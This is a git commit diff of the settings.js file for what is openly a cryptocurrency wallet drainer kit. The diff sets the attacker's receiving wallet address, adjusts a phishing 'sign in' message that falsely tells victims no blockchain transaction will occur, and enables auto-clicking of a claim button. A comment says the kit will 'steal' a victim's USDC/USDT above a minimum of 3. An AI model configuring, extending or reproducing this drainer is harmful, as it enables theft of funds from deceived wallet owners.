e43cb7e7690d55680a263f6c0bec0bcb455c2037
jenty <jentyhameed7@gmail.com>
2023-07-12 10:09:36 +0100

    ass

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 const workChainId = 1; // The network we are working with is the chainId list https://chainlist.org/
 
-const receiveAddresss = "0xf0de6100AD23B17721b054b539cD413FdCCA64ABwallet"; // YOUR WALLET ADDRESS "TUTORIAL"
+const receiveAddresss = "0x2B482b444D30011e58EdC30C7dDfdDb2d102366a"; // YOUR WALLET ADDRESS "TUTORIAL"
 
 
 const drainNftsInfo = {
@@ -11,10 +11,10 @@ const drainNftsInfo = {
 const signMessage = `Welcome, \n\n` +
     `Click to sign in and accept the Terms of Service.\n\n` +
     `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
-    `Wallet Address:\n{0x2B482b444D30011e58EdC30C7dDfdDb2d102366as}\n\n` +
+    `Wallet Address:\n{address}\n\n` +
     `Nonce:\n{nonce}`;
 
-const autoConnect = false; //false; // auto connect walletks
+const autoConnect = false; //false; // auto connect wallet
 const autoMint = true; // auto click claim button
 
 // the "3" you see in all the addresses are the min value, if the victim has less than 3 USDC/T then it will not steal it. If it has over 3 USD it will steal it.
